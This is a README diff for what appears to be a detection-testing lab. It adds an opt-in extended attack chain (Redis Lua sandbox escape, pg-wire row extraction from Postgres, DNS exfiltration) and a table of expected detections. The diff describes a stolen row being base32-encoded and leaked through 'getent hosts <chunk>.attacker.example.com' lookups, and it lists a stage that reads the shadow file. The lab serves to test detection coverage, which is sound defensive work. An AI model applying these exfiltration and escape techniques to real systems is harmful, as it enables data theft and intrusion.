@@ -125,6 +125,56 @@ Coverage: 4 / 7 expected detections matched
 The 3 BLIND rows are intentional — see `example/chain/README.md`
 section "How to unblind".
 
+### Extended chain (opt-in: real pg-wire + DNS exfil)
+
+```bash
+./scripts/local-ci-chain.sh --use-published --extended
+```
+
+`--extended` runs two additional stages after the basic chain:
+
+- **s5-pivot-pg-protocol-extract-row** — perl one-liner inside the
+  redis Lua sandbox speaks real pg-wire (V3 StartupMessage + Query +
+  parse DataRow) and extracts one row from chain-postgres back to the
+  redis pod. The HTTP response carries the extracted bytes through the
+  frontend (`PG_ROW=<actual-postgres-row>`). Stage 3's SSLRequest-only
+  predecessor proved connectivity; s5 proves data moves cross-pod.
+
+- **s6-dns-exfil-of-stolen-row** — same primitive, different sink.
+  After extracting the row, perl base32-encodes it and slices into
+  30-char DNS labels. One `getent hosts <chunk>.attacker.example.com`
+  per chunk. With `networkEventsStreaming: enable` each lookup
+  becomes an R0005 alert with the encoded label visible in
+  `alert.labels.address` — operators see the leaked bytes in the
+  SIEM, not just an anomaly count.
+
+Expected output (extended; 6/12 = same DETECTED set + 2 new R0001
+perl detections from s5/s6, all 4 new BLINDs map to the same operator
+knobs):
+
+```
+SCENARIO                              RULE    CONTAINER  COMM    STATUS
+s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
+s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
+s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
+s3-pivot-redis-as-pg-client           R0011   redis              BLIND
+s4-exfil-to-internet                  R0001   redis      perl    DETECTED
+s4-exfil-to-internet                  R0005   redis              BLIND
+s4-exfil-to-internet                  R0011   redis              BLIND
+s5-pivot-pg-protocol-extract-row      R0001   redis      perl    DETECTED
+s5-pivot-pg-protocol-extract-row      R0011   redis              BLIND
+s6-dns-exfil-of-stolen-row            R0001   redis      perl    DETECTED
+s6-dns-exfil-of-stolen-row            R0005   redis              BLIND
+s6-dns-exfil-of-stolen-row            R0011   redis              BLIND
+
+Coverage: 6 / 12 expected detections matched
+```
+
+Requires `chain.yaml` to set `POSTGRES_HOST_AUTH_METHOD=trust` on
+chain-postgres (already configured in this branch). The basic chain
+still works either way — Stage 3 only sends SSLRequest bytes and
+reads the `N` (no SSL) reply, which doesn't depend on auth mode.
+
 ### Pinning to a specific build
 
 `:latest` only tracks `main`. To pin to a specific branch SHA (useful
@@ -150,6 +200,8 @@ Only needed if you're iterating on the Go services or chain manifests:
 ./scripts/local-ci-chain.sh                    # full pipeline, builds + ttl.sh-pushes
 ./scripts/local-ci-chain.sh --setup-only       # just deploy + learn
 ./scripts/local-ci-chain.sh --attack-only      # re-run chain against existing deploy
+./scripts/local-ci-chain.sh --extended         # also run s5 (pg-wire) + s6 (DNS exfil)
+./scripts/local-ci-chain.sh --attack-only --extended  # re-run incl. extended stages
 ```
 
 The local path builds chain-{frontend,backend} from
